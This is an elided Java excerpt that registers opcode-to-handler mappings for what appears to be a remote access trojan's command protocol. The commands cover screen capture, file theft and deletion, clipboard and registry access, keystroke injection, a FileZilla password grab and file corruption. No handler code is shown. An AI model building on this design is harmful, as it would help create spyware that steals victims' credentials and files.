...
public abstract class AbstractIncomingPacket {
	...
	static {
		...
		incomingPackets.put(/* "MSGBOX" */(byte) 10, PacketMSGBOX.class);
		incomingPackets.put(/* "DISCONNECT" */(byte) 11, Packet11Disconnect.class);
		incomingPackets.put(/* "GETSCREEN" */(byte) 12, PacketGETSCREEN.class);
		incomingPackets.put(/* "GETSCREENONCE" */(byte) 13, PacketGETSCREENONCE.class);
		incomingPackets.put(/* "VISITURL" */(byte) 14, Packet14VisitURL.class);
		incomingPackets.put(/* "LISTFILES" */(byte) 15, PacketLISTFILES.class);
		incomingPackets.put(/* "DELETEFILE" */(byte) 16, PacketDELETEFILE.class);
		...
		incomingPackets.put(/* "GETFILE" */(byte) 21, PacketGETFILE.class);
		...
		incomingPackets.put(/* "GETRAM" */(byte) 33, PacketGETRAM.class);
		incomingPackets.put(/* "CUSTOMDL" */(byte) 34, PacketCUSTOMDL.class);
		...
		incomingPackets.put(/* "DIR" */(byte) 41, PacketDIR.class);
		incomingPackets.put(/* "TAKEFILE" */(byte) 42, PacketTAKEFILE.class);
		incomingPackets.put(/* "MKDIR" */(byte) 43, PacketMKDIR.class);
		...
		incomingPackets.put(/* "RNTO" */(byte) 47, PacketRNTO.class);
		...
		incomingPackets.put(/* "FIND" */(byte) 53, PacketFIND.class);
		incomingPackets.put(/* "EFIND" */(byte) 54, PacketEFIND.class);
		...
		incomingPackets.put(/* "GETUT" */(byte) 57, PacketGETUT.class);
		incomingPackets.put(/* "NUDGE" */(byte) 58, Packet58NudgeChat.class);
		incomingPackets.put(/* "CBOARD" */(byte) 59, Packet59Clipboard.class);
		incomingPackets.put(/* "RD" */(byte) 60, PacketRD.class);
		incomingPackets.put(/* "JVM" */(byte) 61, Packet61SystemJavaProperties.class);
		incomingPackets.put(/* "IMGP" */(byte) 62, PacketIMGP.class);
		incomingPackets.put(/* "ZIP" */(byte) 63, PacketZIP.class);
		incomingPackets.put(/* "MD5" */(byte) 64, PacketMD5.class);
		incomingPackets.put(/* "BEEP" */(byte) 65, Packet65Beep.class);
		incomingPackets.put(/* "PIA" */(byte) 66, PacketPIA.class);
		incomingPackets.put(/* "CPIA" */(byte) 67, PacketCPIA.class);
		incomingPackets.put(/* "FZ" */(byte) 68, Packet68FileZillaPassword.class);
		incomingPackets.put(/* "PRINTER" */(byte) 69, PacketPRINTER.class);
		incomingPackets.put(/* "CORRUPT" */(byte) 70, PacketCORRUPT.class);
		...
		incomingPackets.put(/* "GC" */(byte) 74, PacketGC.class);
		incomingPackets.put(/* "SESRED" */(byte) 75, Packet75Redirect.class);
		incomingPackets.put(/* "SPEECH" */(byte) 76, PacketSPEECH.class);
		incomingPackets.put(/* "LISTSER" */(byte) 77, Packet77ListServices.class);
		incomingPackets.put(/* "LISTSTARTUP" */(byte) 78, PacketLISTSTARTUP.class);
		incomingPackets.put(/* "REG" */(byte) 79, PacketREG.class);
		incomingPackets.put(/* "REGC" */(byte) 80, PacketREGC.class);
		incomingPackets.put(/* "LISTINSTALL" */(byte) 81, PacketLISTINSTALL.class);
		...
		incomingPackets.put(/* "SO" */(byte) 84, PacketSO.class);
		incomingPackets.put(/* "LISTI" */(byte) 85, PacketLISTI.class);
		...
		incomingPackets.put(/* "M" */(byte) 91, PacketM.class);
		incomingPackets.put(/* "P" */(byte) 92, PacketP.class);
		incomingPackets.put(/* "R" */(byte) 93, PacketR.class);
		incomingPackets.put(/* "KP" */(byte) 94, PacketKP.class);
		incomingPackets.put(/* "KR" */(byte) 95, PacketKR.class);
		...
		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 98, PacketQUICKDESKTOP.class);
		incomingPackets.put(/* "ENC" */(byte) 99, PacketENC.class);
	}
